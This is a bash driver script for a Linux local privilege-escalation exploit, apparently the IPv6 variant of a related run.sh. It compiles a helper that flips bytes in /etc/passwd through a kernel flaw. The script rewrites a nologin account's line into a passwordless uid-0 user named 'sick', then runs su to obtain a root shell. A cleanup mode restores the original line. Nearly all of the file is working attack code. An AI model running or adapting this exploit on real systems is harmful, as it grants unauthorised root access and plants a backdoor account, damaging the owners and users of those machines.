#!/usr/bin/env bash
# IPv6 dual of run.sh. Same flow, esp6 over ::1.
#
# Usage:
#   ./run.sh           install + drop into root shell
#   ./run.sh --clean   undo the install

set -u
HERE=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
ROOT=$(cd "$HERE/.." && pwd)
STATE=/var/tmp/.cf2v6.state
NEW_USER=sick
PREFIX="${NEW_USER}::0:0:"
SUFFIX=":/:/bin/bash"

red()   { printf '\033[31m%s\033[0m\n' "$*" >&2; }
green() { printf '\033[32m%s\033[0m\n' "$*"; }
blue()  { printf '\033[34m=== %s\033[0m\n' "$*"; }

setup_usns() {
    if unshare -U -r -n -- /bin/sh -c 'ip link add type dummy 2>/dev/null && ip link del dev dummy0 2>/dev/null' 2>/dev/null; then
        USNS=(unshare -U -r -n --)
        return
    fi
    if [ -n "${AAR:-}" ] && [ -x "$AAR" ]; then
        USNS=("$AAR" -n --); return
    fi
    if command -v aa-rootns >/dev/null 2>&1; then
        USNS=("$(command -v aa-rootns)" -n --); return
    fi
    if [ ! -x "$ROOT/aa-rootns" ] && [ -f "$ROOT/aa-rootns.c" ]; then
        gcc -O2 -Wall "$ROOT/aa-rootns.c" -o "$ROOT/aa-rootns" \
            || { red "build aa-rootns failed"; exit 1; }
    fi
    if [ -x "$ROOT/aa-rootns" ]; then
        USNS=("$ROOT/aa-rootns" -n --); return
    fi
    red "no usable userns harness"
    exit 1
}

build_helper() {
    [ -x "$HERE/copyfail2v6" ] || gcc -O2 -Wall "$HERE/copyfail2v6.c" -o "$HERE/copyfail2v6" -lcrypto \
        || { red "build copyfail2v6 failed (need libssl-dev)"; exit 1; }
}

flip_range() {
    local line_off=$1 src=$2 dst=$3 len=${#2}
    local i o t off
    declare -ag FLIPS=()
    for ((i=0; i<len; i++)); do
        o="${src:$i:1}"
        t="${dst:$i:1}"
        if [ "$o" != "$t" ]; then
            FLIPS+=("$((line_off + i)):$(printf '0x%02x' "'$t")")
        fi
    done
    for f in "${FLIPS[@]}"; do
        off=${f%:*} ; t=${f#*:}
        "${USNS[@]}" "$HERE/copyfail2v6" /etc/passwd "$off" "$t" >/dev/null
    done
}

if [ "${1:-}" = "--clean" ] || [ "${1:-}" = "-c" ]; then
    [ -r "$STATE" ] || { red "no state file at $STATE"; exit 1; }
    # shellcheck disable=SC1090
    . "$STATE"
    : "${LINE_OFF:?missing LINE_OFF in state}" "${VICTIM_LINE:?missing VICTIM_LINE in state}"
    VICTIM_LEN=${#VICTIM_LINE}

    setup_usns
    build_helper

    CURRENT=$(dd if=/etc/passwd bs=1 skip="$LINE_OFF" count="$VICTIM_LEN" 2>/dev/null)
    if [ "$CURRENT" = "$VICTIM_LINE" ]; then
        green "[+] /etc/passwd already matches original"
        rm -f "$STATE"
        exit 0
    fi

    declare -a CFLIPS=()
    for ((i=0; i<VICTIM_LEN; i++)); do
        o="${CURRENT:$i:1}"
        t="${VICTIM_LINE:$i:1}"
        [ "$o" != "$t" ] && CFLIPS+=("$((LINE_OFF + i)):$(printf '0x%02x' "'$t")")
    done

    blue "Cleanup: revert ${#CFLIPS[@]} bytes at offset $LINE_OFF"
    for f in "${CFLIPS[@]}"; do
        off=${f%:*} ; t=${f#*:}
        "${USNS[@]}" "$HERE/copyfail2v6" /etc/passwd "$off" "$t" >/dev/null
    done

    if grep -q "^${NEW_USER}::0:0:" /etc/passwd; then
        red "sick line still present"
        exit 1
    fi
    rm -f "$STATE"
    green "[+] cleaned"
    exit 0
fi

if [ "${1:-}" = "--help" ] || [ "${1:-}" = "-h" ]; then
    sed -n '2,7p' "$0"
    exit 0
fi

if getent passwd "$NEW_USER" | grep -q "^${NEW_USER}::0:0:"; then
    green "[+] '$NEW_USER' already in /etc/passwd"
    exec su - "$NEW_USER"
fi

setup_usns
build_helper

getent passwd "$NEW_USER" >/dev/null \
    && { red "'$NEW_USER' already exists with non-uid-0 entry"; exit 1; }

VICTIM_LINE=$(awk -F: '
    $NF == "/usr/sbin/nologin" || $NF == "/sbin/nologin" ||
    $NF == "/bin/false" || $NF == "/usr/bin/false" || $NF == "/bin/sync" {
        if (length($0) > maxlen) { maxlen = length($0); maxline = $0 }
    }
    END { print maxline }
' /etc/passwd)
[ -n "$VICTIM_LINE" ] || { red "no victim line found"; exit 1; }
VICTIM_NAME=${VICTIM_LINE%%:*}
VICTIM_LEN=${#VICTIM_LINE}

PAD_LEN=$((VICTIM_LEN - ${#PREFIX} - ${#SUFFIX}))
[ "$PAD_LEN" -ge 0 ] \
    || { red "victim '$VICTIM_NAME' line too short ($VICTIM_LEN chars)"; exit 1; }
PAD=$(printf '%*s' "$PAD_LEN" '' | tr ' ' 'X')
TARGET_LINE="${PREFIX}${PAD}${SUFFIX}"

LINE_OFF=$(grep -nob "^$VICTIM_NAME:" /etc/passwd | head -1 | cut -d: -f2)

umask 077
{
    echo "LINE_OFF=$LINE_OFF"
    printf 'VICTIM_LINE=%q\n' "$VICTIM_LINE"
} > "$STATE"

blue "Stage 1: overwrite '$VICTIM_NAME' line ($VICTIM_LEN bytes)"
flip_range "$LINE_OFF" "$VICTIM_LINE" "$TARGET_LINE"

blue "Stage 2: verify"
grep "^$NEW_USER:" /etc/passwd || { red "mutation didn't land"; exit 1; }

blue "Stage 3: su - $NEW_USER"
green "[i] state at $STATE; ./run.sh --clean to revert"
exec su - "$NEW_USER"
